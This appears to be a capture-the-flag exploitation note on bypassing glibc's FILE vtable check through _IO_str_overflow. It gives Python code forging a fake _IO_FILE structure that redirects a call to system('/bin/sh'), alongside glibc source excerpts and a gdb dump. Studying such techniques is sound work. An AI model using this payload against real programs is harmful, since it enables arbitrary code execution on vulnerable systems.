## bypass vtable check
babyprintf shows a way to bypass vtable check.
Another way can be seen [here](http://blog.rh0gue.com/2017-12-31-34c3ctf-300/)

In _IO_str_overflow:
v5=[fp+0x38],
v6=[fp+0x40]-v5,
v7=2*v6+100,
v6<=v7,
call [fp+0xe0](arg: v7)
```python
fake_file = p64(0) + p64(0x61) + p64(0xdeadbeef) + p64(io_list_all-0x10)
fake_file += p64(0xffffffffffffff) + p64(0)*3 + p64((binsh_addr-100)/2)
```
```c
_IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
        return EOF;
        ......
```
```python
fake_file = fake_file.ljust(0xa0, "\x00")
fake_file += p64(libc_addr+8) #_IO_wide_data
```
satisfied the second condition:
```c
 if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
```
```python
fake_file = fake_file.ljust(0xc0, '\x00')
fake_file += p64(1) #_mode
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(io_str_jumps)
fake_file += p64(system_addr)
payload += fake_file
```
## Extend
Actually, the structure of _IO_FILE is just like:
```shell
gef>  p (struct _IO_FILE_plus)*0x55aae89462b0
$1 = {
  file = {
    _flags = 0x0, 
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
    _IO_read_end = 0xdeadbeef <error: Cannot access memory at address 0xdeadbeef>, 
    _IO_read_base = 0x7fe78a0c6610 "", 
    _IO_write_base = 0xffffffffffffff <error: Cannot access memory at address 0xffffffffffffff>, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x3ff3c4f4775e <error: Cannot access memory at address 0x3ff3c4f4775e>, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0x0, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x0, 
    _offset = 0x0, 
    _codecvt = 0x0, 
    _wide_data = 0x7fe789ceb008, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x1, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x7fe78a0c24a0 <_IO_str_jumps>
}
```
```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```
## link
https://code.woboq.org/userspace/glibc/libio/bits/types/struct_FILE.h.html#_IO_FILE